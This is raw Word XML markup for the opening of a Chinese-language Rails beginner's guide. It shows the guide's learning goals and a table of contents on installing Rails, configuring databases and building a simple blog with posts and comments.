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EB7BFC" w14:textId="5EF7D72A" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00CF489B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>起步</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45004B90" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 初上手指南</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="375FA50F" w14:textId="2BC8F923" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>1.1、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Rails 初上手指南</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4C10C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本指导手册涉及了使用和运行 Ruby on Rails，通过阅读本指导，你会了解到：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602D9F4D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>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（怎样）安装，创建一个新的 Rails 应用程序，并且将你的应用程序连接到数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51453F8A" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>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Rails 的一般（页面）布局</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A3608E" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>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MVC 的基本原则和 </w:t>
      </w:r>
      <w:r w:rsidRPr="00505D4B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设计（理念）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBC161B" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>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怎样迅速地开始一个 Rails 应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A8E093"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BC4E48"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9" w:anchor="1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>手册假设</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6813E2C4"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10" w:anchor="2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 是什么</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5DEF6566"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11" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>MVC 架构</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4411DEFC"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12" w:anchor="3" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 的组件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7CA436B8"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13" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Action Pack</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42D4347E"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14" w:anchor="4" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>REST</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="61EEA528"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15" w:anchor="5" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>建立一个新的 Rails 应用程序</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B42D224"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16" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>安装 Rails</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D84640D"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17" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Creating the Blog Application</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AFF30AD"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18" w:anchor="6" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AFB0A53"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19" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个 SQLite3 数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BC81C2C"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20" w:anchor="6-2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个 MySQL 数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16ED8DF1"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21" w:anchor="6-3" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个 PostgreSQL 数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="326B14BE"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22" w:anchor="6-4" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个用于 JRuby 平台的 SQLite3 数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="51078DB8"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23" w:anchor="6-5" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个用于 JRuby 平台的 PostgreSQL 数据库</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="29D4BDBD"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24" w:anchor="7" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hello, Rails!</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="617FB2BB"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25" w:anchor="7-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>启动web服务</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AF89D2D"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26" w:anchor="7-2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 说 Hello"</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2EB2C11C"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27" w:anchor="7-3" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>设置应用程序主页</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1AA70918"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28" w:anchor="8" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用 Scaffolding 快速创建并运行</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1514A0DC"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29" w:anchor="9" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建一个资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="536BC1CE"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30" w:anchor="9-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>执行数据迁移</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67F6EA47"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31" w:anchor="9-2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>添加一个 Link</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="06869BF5"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32" w:anchor="9-3" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Working with Posts in the Browser</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7519CAA3"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33" w:anchor="9-4" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>The Model</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="797FB7BD"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34" w:anchor="9-5" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>添加一些验证</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="33B8B67C"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35" w:anchor="9-6" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用控制台</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="503D9162"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36" w:anchor="9-7" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Listing All Posts</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64FF2A60"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37" w:anchor="9-8" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>定制布局</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2C09938C"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38" w:anchor="9-9" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>建立新文章</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="066E2034"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39" w:anchor="9-10" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>显示一条 Post</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49D62329"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40" w:anchor="9-11" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>编辑Posts</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="370FC58B"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41" w:anchor="9-12" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>删除一个post</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="731A43AE"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42" w:anchor="10" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>添加第二个Model（comment）</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="51A3506A"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43" w:anchor="10-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>构造一个model</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0150C30F"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44" w:anchor="10-2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Associating Models</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1257D40B"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45" w:anchor="10-3" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>给Comments添加路由</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E6E6950"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46" w:anchor="10-4" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>构造一个 Controller</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7CCAF3B2"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47" w:anchor="11" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>重构</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10F3DCB7"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48" w:anchor="11-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rendering Partial Collections</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7667256E"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49" w:anchor="11-2" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rendering a Partial Form</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E13DBB4"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50" w:anchor="12" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Deleting Comments</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AE07437" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId51" w:anchor="12-1" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Deleting Associated Objects</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5FD72424"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52" w:anchor="13" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
